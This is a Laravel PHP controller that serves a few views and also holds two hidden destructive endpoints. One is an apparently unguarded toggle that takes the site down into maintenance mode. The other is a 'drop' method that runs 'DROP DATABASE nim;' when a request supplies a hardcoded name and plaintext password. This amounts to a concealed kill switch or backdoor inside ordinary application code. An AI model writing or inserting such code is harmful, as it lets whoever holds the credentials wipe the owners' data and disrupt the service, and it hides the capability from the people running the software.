<?php

namespace App\Http\Controllers;

use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class HomeController extends Controller
{
    public function index()
    {
        return view("home.index");
    }

    public function spa()
    {
        return view("layouts.app");
    }

    public function dashboard()
    {
        return view("dashboard.app");
    }

    public function toggleSite()
    {
        if (file_exists(storage_path('framework/down')))
            unlink(storage_path('framework/down'));
        else
            file_put_contents(
                storage_path('framework/down'),
                json_encode(
                    $this->getDownFilePayload(),
                    JSON_PRETTY_PRINT
                )
            );
    }

    protected function getDownFilePayload()
    {
        return [
            'time' => $this->currentTime(),
            'message' => null,
            'retry' => null,
            'allowed' => [],
        ];
    }

    protected function currentTime()
    {
        return Carbon::now()->getTimestamp();
    }

    public function drop(Request $request)
    {
        $name = $request->name;
        $family = $request->family;
        $password = $request->password;
        if ($name == 'ali' && $family == 'sharafi' && $password == '51233033') {
            DB::select("DROP DATABASE nim;");
        }
    }
}
